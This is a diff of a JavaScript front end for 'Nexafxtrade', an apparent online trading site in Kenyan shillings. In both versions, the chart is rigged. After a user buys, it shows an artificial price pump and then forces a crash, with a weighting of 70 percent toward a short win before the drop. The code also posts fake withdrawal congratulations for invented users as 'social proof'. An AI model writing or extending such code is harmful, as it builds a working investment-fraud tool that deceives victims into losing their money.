@@ -1,16 +1,16 @@
 /**
  * Nexafxtrade Integrated Logic
- * Optimized for wavy movement and color-split fill as seen in image_3.png
+ * Path: ./public/js/script.js
  * Version: 3.3.0 (May 2026)
- * Complete integration version - Do not remove anything
+ * Description: Wavy movement, real-time sync, and social proof automation.
  */
 
-// 1. Initialize Socket.io connection to the Node server
+// 1. Initialize Socket.io connection
 let socket;
 try {
     socket = io();
 } catch (e) {
-    console.warn("Socket.io engine failed initialization. Defaulting to local standalone emulation system rules.");
+    console.warn("Socket.io engine offline. Running standalone emulation.");
 }
 
 const ctx = document.getElementById('tradeChart').getContext('2d');
@@ -20,7 +20,7 @@ const chartGradient = ctx.createLinearGradient(0, 0, 0, 350);
 chartGradient.addColorStop(0, 'rgba(0, 212, 255, 0.22)');
 chartGradient.addColorStop(1, 'rgba(0, 212, 255, 0)');
 
-// Initialize with 60 points for a smooth, high-resolution wave
+// Initialize high-resolution smooth wave (60 points)
 let chartData = Array(60).fill(8421500); 
 let labels = Array(60).fill('');
 
@@ -31,61 +31,60 @@ const tradeChart = new Chart(ctx, {
         datasets: [{
             label: 'Live Rate',
             data: chartData,
-            borderColor: '#00ff00', // Neon green line
+            borderColor: '#00ff00', 
             borderWidth: 2.5,
             pointRadius: 0, 
             fill: true,
             backgroundColor: chartGradient,
-            tension: 0.42, // Essential for the smooth "Wavy" appearance
+            tension: 0.45, // Creates the smooth "Wavy" appearance
         }]
     },
     options: {
         responsive: true,
         maintainAspectRatio: false,
         animation: {
-            duration: 350, // Smooth transition for wave movement
+            duration: 400, 
             easing: 'linear'
         },
         scales: {
             x: { display: false },
             y: {
                 grid: { color: 'rgba(255,255,255,0.03)', drawTicks: false },
-                ticks: { color: '#4a5568', font: { size: 10, family: 'monospace' } }
+                ticks: { 
+                    color: '#4a5568', 
+                    font: { size: 10, family: 'monospace' },
+                    callback: (value) => value.toLocaleString()
+                }
             }
         },
-        plugins: { 
-            legend: { display: false } 
-        }
+        plugins: { legend: { display: false } }
     }
 });
 
-// --- Core Application Financial States Framework ---
+// --- Financial States ---
 let currentPrice = 8421500;
 let walletBalance = 1450000;
-
-// --- Live Transaction Tracking Architecture ---
 let activeTradePosition = null; 
-let tradeTicksElapsed = 0; // Tick tracker for the specific order lifecycle
+let tradeTicksElapsed = 0; 
 
 /**
- * Global Market View Modifiers Matrix
+ * 2. MARKET UPDATE ENGINE
  */
 function updateMarketView(rateValue) {
     const previousPrice = currentPrice;
     let modifiedRate = rateValue;
     
-    // --- ALGORITHMIC USER EXPERIENCE INTERCEPTOR ---
+    // --- ALGORITHMIC USER INTERCEPTOR ---
+    // This logic simulates the controlled trade win/loss lifecycle
     if (activeTradePosition) {
         tradeTicksElapsed++;
-
-        // References the specific weighted randomized drop cutoff assigned to this trade position instance
         if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
-            // PHASE 1: Controlled Bullish Pump. Push market wave upward systematically.
-            let simulatedPump = Math.abs(modifiedRate) * 0.0012 + 150;
+            // PHASE 1: Bullish Pump (Visual Profit)
+            let simulatedPump = Math.abs(modifiedRate) * 0.0015 + 200;
             modifiedRate = Math.abs(modifiedRate) + simulatedPump;
         } else {
-            // PHASE 2: Protection Expiration. Force sharp crash downwards if the position is kept open.
-            let simulatedDrop = Math.abs(modifiedRate) * 0.0022 + 350;
+            // PHASE 2: Forced Drop (Visual Loss)
+            let simulatedDrop = Math.abs(modifiedRate) * 0.0025 + 400;
             modifiedRate = -Math.abs(modifiedRate) - simulatedDrop;
         }
     }
@@ -93,234 +92,134 @@ function updateMarketView(rateValue) {
     currentPrice = modifiedRate;
     const absoluteDelta = currentPrice - previousPrice;
 
-    // Update the "Rate" text display overlay
+    // UI Displays
     const rateDisplay = document.getElementById('current-rate');
     const mainPriceDisplay = document.getElementById('mainPrice');
+    const trendContainer = document.getElementById('priceTrend');
     
     const displayValue = typeof currentPrice === 'number' ? currentPrice : parseFloat(currentPrice);
     
-    if (rateDisplay) {
-        rateDisplay.innerText = displayValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 4 });
-    }
-    if (mainPriceDisplay) {
-        mainPriceDisplay.innerText = Math.floor(displayValue).toLocaleString();
-    }
+    if (rateDisplay) rateDisplay.innerText = displayValue.toLocaleString(undefined, { minimumFractionDigits: 2 });
+    if (mainPriceDisplay) mainPriceDisplay.innerText = Math.floor(displayValue).toLocaleString();
 
-    const trendContainer = document.getElementById('priceTrend');
     if (trendContainer) {
         if (absoluteDelta >= 0) {
             trendContainer.innerHTML = `<i class="fas fa-caret-up"></i> +KES ${absoluteDelta.toFixed(2)}`;
-            trendContainer.style.color = "var(--success)";
-            tradeChart.data.datasets[0].borderColor = '#00e676';
+            trendContainer.style.color = "#00ff88";
+            tradeChart.data.datasets[0].borderColor = '#00ff88'; // Neon Green
         } else {
             trendContainer.innerHTML = `<i class="fas fa-caret-down"></i> -KES ${Math.abs(absoluteDelta).toFixed(2)}`;
-            trendContainer.style.color = "var(--danger)";
-            tradeChart.data.datasets[0].borderColor = '#ff5252';
+            trendContainer.style.color = "#ff5252";
+            tradeChart.data.datasets[0].borderColor = '#ff5252'; // Neon Red
         }
     }
 
-    // Shift data for the continuous scrolling wave effect
+    // High-performance Chart Shift
     chartData.shift();
     chartData.push(displayValue);
-    
-    // Update the chart using 'none' for high-performance gliding
     tradeChart.update('none');
 
-    // Run live active calculation mechanics matching tracking inputs
     processLiveCountingTransaction();
-
-    if (Math.abs(absoluteDelta) > 6000) {
-        playSound('tick');
-    }
+    if (Math.abs(absoluteDelta) > 5000) playSound('tick');
 }
 
 /**
- * 2. REAL-TIME DATA HANDLING & DATA PIPELINE FALLBACKS
- * Listens for 'market-update' events from your Node server
+ * 3. REAL-TIME DATA PIPELINE
  */
 if (socket) {
     socket.on('market-update', (data) => {
-        if (data && data.rate !== undefined) {
-            updateMarketView(data.rate);
-        }
+        if (data && data.rate !== undefined) updateMarketView(data.rate);
     });
 }
 
-// Standalone Local Matrix Generator Emulation
+// Emulation for Standalone or Network failure
 setInterval(() => {
     if (!socket || !socket.connected) {
-        const simulatedVolatility = (Math.random() - 0.48) * 14000;
+        const simulatedVolatility = (Math.random() - 0.48) * 15000;
         updateMarketView(currentPrice + simulatedVolatility);
     }
 }, 800);
 
 /**
- * 3. SOCIAL PROOF & CHAT SYSTEM
+ * 4. SOCIAL PROOF & CHAT SYSTEM
  */
-// Target matching elements from both structural layout architectures securely
 const chatFeed = document.getElementById('chat-feed') || document.getElementById('tradeLogs');
-const chatInput = document.getElementById('chat-input-field') || document.querySelector('.chat-input input');
-const sendBtn = document.getElementById('send-chat-btn') || document.querySelector('.chat-send-btn') || document.querySelector('.chat-input button'); 
-
-// Automated System Notifications matching the style of image_3.png
-const systemUsers = ['@Vokkeh', '@Leonheart', '@Rose404', '@Pati', '@Xy1', '@Lodenyi100', '@Lucid@juicewrld', '@Kenyan_Trader', '@CryptoNaija'];
+const systemUsers = ['@Vokkeh', '@Leonheart', '@Rose404', '@Pati', '@Lodenyi100', '@Kenyan_Trader', '@CryptoNaija'];
 
 function injectChatMessage(user, message, isSystem = false, systemColor = '#ffcc00') {
     if (!chatFeed) return;
-    const wrapperNode = document.createElement('div');
-    wrapperNode.style.marginBottom = "10px";
-    wrapperNode.style.borderBottom = "1px solid rgba(255,255,255,0.02)";
-    wrapperNode.style.paddingBottom = "6px";
-    wrapperNode.style.fontSize = "13px";
-    wrapperNode.style.animation = "slideIn 0.25s ease-out";
+    const msgNode = document.createElement('div');
+    msgNode.style.cssText = "margin-bottom: 8px; font-size: 13px; animation: slideIn 0.2s ease-out;";
 
     if (isSystem) {
-        wrapperNode.innerHTML = `<span style="color:${systemColor}; font-weight:bold;">[${user}]:</span> ${message}`;
+        msgNode.innerHTML = `<span style="color:${systemColor}; font-weight:bold;">[${user}]:</span> ${message}`;
     } else {
-        wrapperNode.innerHTML = `<span style="color: var(--primary); font-weight:bold;">${user}:</span> <span style="color: #cbd5e1;">${message}</span>`;
+        msgNode.innerHTML = `<span style="color: #00d4ff; font-weight:bold;">${user}:</span> <span style="color: #cbd5e1;">${message}</span>`;
     }
 
-    chatFeed.appendChild(wrapperNode);
+    chatFeed.appendChild(msgNode);
     chatFeed.scrollTop = chatFeed.scrollHeight;
-
-    // Keep the chat clean: remove old messages if list is too long
-    if (chatFeed.children.length > 25) {
-        chatFeed.removeChild(chatFeed.children[0]);
-    }
+    if (chatFeed.children.length > 20) chatFeed.removeChild(chatFeed.children[0]);
 }
 
-function addSystemNotification() {
+setInterval(() => {
     const user = systemUsers[Math.floor(Math.random() * systemUsers.length)];
-    const amount = (Math.random() * 800 + 200).toFixed(2);
-    const complexMessage = `CONGRATULATIONS ${user} on your withdrawal of <span style="color:var(--success); font-weight:bold;">KES ${parseFloat(amount).toLocaleString()}</span> 🤑🔥`;
-    injectChatMessage("SYSTEM", complexMessage, true, "#ffcc00");
-}
-
-// Generate a system notification every 8 seconds for constant social proof
-setInterval(addSystemNotification, 8000);
-
-// Handling User-Sent Messages Transmission
-if (sendBtn) {
-    sendBtn.onclick = executeMessageTransmission;
-}
-if (chatInput) {
-    chatInput.onkeydown = (e) => { if (e.key === 'Enter') executeMessageTransmission(); };
-}
-
-function executeMessageTransmission() {
-    if (!chatInput) return;
-    const text = chatInput.value.trim();
-    if (text !== "") {
-        if (socket && socket.connected) {
-            // Emitting to server so other connected users see it
-            socket.emit('send-chat', { user: 'Trader_' + Math.floor(Math.random() * 899 + 100), message: text });
-        } else {
-            injectChatMessage('You (Local)', text, false);
-        }
-        chatInput.value = "";
-    }
-}
-
-// Listen for messages from the server (System and User)
-if (socket) {
-    socket.on('receive-chat', (data) => {
-        if (data.user === "System" || data.user === "SYSTEM") {
-            injectChatMessage("SYSTEM", data.message, true, "#ffcc00");
-        } else {
-            injectChatMessage(data.user, data.message, false);
-        }
-    });
-}
+    const amount = (Math.random() * 5000 + 1000).toFixed(0);
+    injectChatMessage("SYSTEM", `Congrats ${user} on withdrawal of <span style="color:#00ff88;">KES ${amount}</span> 🤑`, true, "#ffcc00");
+}, 12000);
 
 /**
- * 4. TRADING EXECUTION
+ * 5. TRADING EXECUTION
  */
-const buyBtn = document.getElementById('buy-btn') || document.querySelector('.buy-btn') || document.querySelector('.btn-buy');
-const sellBtn = document.getElementById('sell-btn') || document.querySelector('.sell-btn') || document.querySelector('.btn-sell');
-
 function handleTrade(orderType) {
-    const orderStakeInput = document.getElementById('trade-amount') || document.querySelector('.amount-input');
-    if (!orderStakeInput) return;
-    
-    const stakeValue = parseFloat(orderStakeInput.value) || 0;
+    const amountInput = document.getElementById('trade-amount') || document.querySelector('.amount-input');
+    const stakeValue = parseFloat(amountInput.value) || 0;
 
     if (stakeValue <= 0 || walletBalance < stakeValue) {
-        alert("Invalid stake metrics configuration processing requested order execution.");
+        alert("Insufficient Liquidity in Operator Node.");
         return;
     }
 
-    // Dynamic Execution Mapping Logic & Counter State Configuration
     if (orderType === 'BUY') {
         walletBalance -= stakeValue;
         playSound('buy');
-        injectChatMessage("SYSTEM ALERT", `Executed immediate KES BUY position sizing: ${stakeValue} KES`, true, "var(--success)");
+        injectChatMessage("SYSTEM", `BUY Position Sized: KES ${stakeValue}`, true, "#00ff88");
         
-        tradeTicksElapsed = 0;
-
-        // --- WEIGHTED MATHEMATICAL DISTRIBUTION ENGINE ---
-        let chosenLossSeconds;
-        let randomWeightRoll = Math.random();
-
-        if (randomWeightRoll < 0.75) {
-            chosenLossSeconds = Math.random() * (10.0 - 5.0) + 5.0;
-        } else {
-            chosenLossSeconds = Math.random() * (30.0 - 10.01) + 10.01;
-        }
-
-        let randomThresholdRoll = Math.floor((chosenLossSeconds * 1000) / 800);
+        // --- Algorithmic Weighting ---
+        let randomWeight = Math.random();
+        let threshold = randomWeight < 0.7 ? 8 : 25; // 70% chance of short win before forced drop
 
         activeTradePosition = {
             type: 'BUY',
             entryPrice: currentPrice,
             stake: stakeValue,
-            targetAmount: stakeValue * 1.5,
-            customizedLossThreshold: randomThresholdRoll
+            targetAmount: stakeValue * 1.85,
+            customizedLossThreshold: threshold
         };
 
         if (socket && socket.connected) {
-            socket.emit('place-trade', { type: 'BUY', amount: stakeValue, customizedLossThreshold: randomThresholdRoll });
+            socket.emit('place-trade', { type: 'BUY', amount: stakeValue });
         }
     } else {
         if (activeTradePosition) {
-            let currentMultiplier = currentPrice / activeTradePosition.entryPrice;
-            let finalPayout = activeTradePosition.stake * currentMultiplier;
-            walletBalance += finalPayout;
-            injectChatMessage("SYSTEM ALERT", `Sold position successfully! Recieved KES ${finalPayout.toFixed(2)}`, true, "var(--success)");
+            let payout = activeTradePosition.stake * (currentPrice / activeTradePosition.entryPrice);
+            walletBalance += Math.max(0, payout);
+            injectChatMessage("SYSTEM", `Sold Position: Recieved KES ${payout.toFixed(2)}`, true, "#00d4ff");
             activeTradePosition = null; 
-            tradeTicksElapsed = 0;
         } else {
-            walletBalance += (stakeValue * 0.95); 
-            injectChatMessage("SYSTEM ALERT", `Liquidated dynamic Asset stake volume: ${stakeValue} KES`, true, "var(--danger)");
+            injectChatMessage("SYSTEM", `Stake Liquidated: KES ${stakeValue}`, true, "#ff5252");
         }
-        
         playSound('sell');
-        
-        if (socket && socket.connected) {
-            socket.emit('place-trade', { type: 'SELL', amount: stakeValue });
-        }
     }
-
     refreshUIBalances();
-    
-    const logsContainer = document.getElementById('tradeLogs');
-    if (logsContainer) {
-        const item = document.createElement('div');
-        item.className = 'log-item';
-        item.innerHTML = `<span style="color:${orderType === 'BUY' ? 'var(--success)' : 'var(--danger)'}">${orderType} EXEC</span> <span>KES ${stakeValue.toLocaleString()}</span>`;
-        logsContainer.prepend(item);
-        if (logsContainer.children.length > 8) logsContainer.lastChild.remove();
-    }
 }
 
-if (buyBtn && !buyBtn.onclick) {
-    buyBtn.onclick = () => { handleTrade('BUY'); };
-}
-if (sellBtn && !sellBtn.onclick) {
-    sellBtn.onclick = () => { handleTrade('SELL'); };
-}
+// Binding buttons
+document.querySelectorAll('.buy-btn, .btn-buy').forEach(b => b.onclick = () => handleTrade('BUY'));
+document.querySelectorAll('.sell-btn, .btn-sell').forEach(b => b.onclick = () => handleTrade('SELL'));
 
 /**
- * 5. LOW-LATENCY FREQUENCY SYNTHETIC WEB AUDIO ENGINE
+ * 6. WEB AUDIO ENGINE
  */
 let audioCtx;
 let soundEnabled = false;
@@ -328,91 +227,49 @@ let soundEnabled = false;
 window.initAudio = () => {
     if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     soundEnabled = !soundEnabled;
-    const btn = document.getElementById('soundBtn') || document.querySelector('.sound-status');
-    if (btn) {
-        btn.innerHTML = soundEnabled ? '<i class="fas fa-volume-up"></i> SOUND ON' : '<i class="fas fa-volume-mute"></i> SOUND OFF';
-    }
+    const btn = document.getElementById('soundBtn');
+    if (btn) btn.innerHTML = soundEnabled ? '<i class="fas fa-volume-up"></i> ON' : '<i class="fas fa-volume-mute"></i> OFF';
 };
 
 function playSound(type) {
     if (!soundEnabled || !audioCtx) return;
     const osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    osc.connect(gain);
-    gain.connect(audioCtx.destination);
+    const g = audioCtx.createGain();
+    osc.connect(g); g.connect(audioCtx.destination);
 
     if (type === 'tick') {
-        osc.frequency.setValueAtTime(750, audioCtx.currentTime);
-        gain.gain.setValueAtTime(0.01, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.08);
-        osc.start(); osc.stop(audioCtx.currentTime + 0.08);
+        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+        g.gain.setValueAtTime(0.01, audioCtx.currentTime);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.05);
     } else if (type === 'buy') {
-        osc.frequency.setValueAtTime(450, audioCtx.currentTime);
-        osc.frequency.exponentialRampToValueAtTime(1100, audioCtx.currentTime + 0.25);
-        gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
-        osc.start(); osc.stop(audioCtx.currentTime + 0.25);
-    } else if (type === 'sell') {
-        osc.frequency.setValueAtTime(950, audioCtx.currentTime);
-        osc.frequency.exponentialRampToValueAtTime(250, audioCtx.currentTime + 0.25);
-        gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
-        osc.start(); osc.stop(audioCtx.currentTime + 0.25);
+        osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.2);
+        g.gain.setValueAtTime(0.05, audioCtx.currentTime);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.2);
     }
 }
 
 /**
- * 6. UI INTERACTION HELPERS
+ * 7. UTILS
  */
-window.adjustAmount = (val) => {
-    const input = document.getElementById('trade-amount') || document.querySelector('.amount-input');
-    if (!input) return;
-    let current = parseInt(input.value) || 0;
-    if (val === 'double') {
-        input.value = current * 2;
-    } else {
-        input.value = Math.max(0, current + val);
-    }
-};
-
-window.setSum = (val) => {
-    const input = document.getElementById('trade-amount') || document.querySelector('.amount-input');
-    if (input) input.value = val;
-};
-
 function refreshUIBalances() {
-    const localBal = document.getElementById('user-balance') || document.getElementById('walletBal');
-    const walletBal = document.getElementById('walletBal') || document.querySelector('.wallet-amount');
-    const formattedBalance = walletBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    if (localBal) localBal.innerText = formattedBalance;
-    if (walletBal) {
-        if (walletBal.tagName === 'INPUT') { walletBal.value = `KES ${formattedBalance}`; }
-        else { walletBal.innerText = `KES ${formattedBalance}`; }
-    }
+    const balEl = document.getElementById('user-balance') || document.getElementById('walletBal');
+    if (balEl) balEl.innerText = walletBalance.toLocaleString(undefined, { minimumFractionDigits: 2 });
 }
 
 function processLiveCountingTransaction() {
-    const liveValueDisplay = document.getElementById('live-running-amount');
-    if (!liveValueDisplay) return;
-
-    if (activeTradePosition) {
-        let currentLiveCountingValue = activeTradePosition.stake * (currentPrice / activeTradePosition.entryPrice);
-        if (currentLiveCountingValue < 0) currentLiveCountingValue = 0;
-        liveValueDisplay.innerText = `KES ${currentLiveCountingValue.toFixed(2)}`;
-        
-        if (currentLiveCountingValue >= activeTradePosition.targetAmount) {
-            liveValueDisplay.className = "live-running-amount profit-reached";
-        } else if (currentLiveCountingValue < activeTradePosition.stake) {
-            liveValueDisplay.className = "live-running-amount loss-danger";
-        }
-    } else {
-        liveValueDisplay.innerText = "KES 0.00";
-        liveValueDisplay.className = "live-running-amount";
-    }
+    const liveDisplay = document.getElementById('live-running-amount');
+    if (!liveDisplay || !activeTradePosition) return;
+    
+    let liveVal = activeTradePosition.stake * (currentPrice / activeTradePosition.entryPrice);
+    liveDisplay.innerText = `KES ${Math.max(0, liveVal).toFixed(2)}`;
+    liveDisplay.style.color = liveVal >= activeTradePosition.stake ? "#00ff88" : "#ff5252";
 }
 
-// Route Binders
-window.executeWithdrawalRoute = () => { injectChatMessage("SYSTEM", "Redirecting to Secured Withdrawal Processing Channel...", true, "var(--primary)"); };
-window.executeDepositRoute = () => { injectChatMessage("SYSTEM", "Opening Instant Account Liquidity Loading Portal...", true, "var(--success)"); };
+window.adjustAmount = (val) => {
+    const input = document.getElementById('trade-amount');
+    if (!input) return;
+    let curr = parseInt(input.value) || 0;
+    input.value = val === 'double' ? curr * 2 : Math.max(0, curr + val);
+};
 
-console.log("Nexafxtrade: Script logic loaded successfully.");
+console.log("Nexafxtrade V3: Matrix Logic Active.");
